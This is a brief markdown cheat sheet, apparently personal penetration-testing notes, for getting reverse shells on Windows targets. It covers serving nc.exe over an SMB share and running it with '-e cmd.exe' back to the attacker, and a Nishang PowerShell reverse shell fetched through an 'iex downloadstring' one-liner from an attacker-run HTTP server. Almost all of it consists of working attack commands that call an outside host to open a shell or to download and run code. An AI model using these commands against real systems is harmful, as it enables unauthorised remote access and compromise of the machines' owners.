- [SMB and netcat](#Netcat)
- [Nishang](#Nishang)
- [Metasploit](#Metasploit)

# Netcat
- On your local machine run smb server
```
mkdir smb; cd smb; cp /usr/share/windows-resources/binaries/nc.exe .;cd ..
```
- Run SMB server and netcat listener
```
smbserver.py share smb

nc -lnvp <your port>
```
 On vulnerable app
 ```
 \\<your_local_ip>\share\nc.exe -e cmd.exe <your_local_ip> <your_local_port>
 ```
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
# Nishang
Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security.

- Copy InvokePowerShellTcp.ps1 from /opt/nishang/Shells/
Example invocation for the reverse shell:
```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```
- run python HTTP server
```
python -m http.server 9090
```
- Get powershell script
```
powershell iex(new-object net.webclient).downloadstring('http://<your_python_server_address>:9090/Invoke-PowerShellTcp.ps1')
```
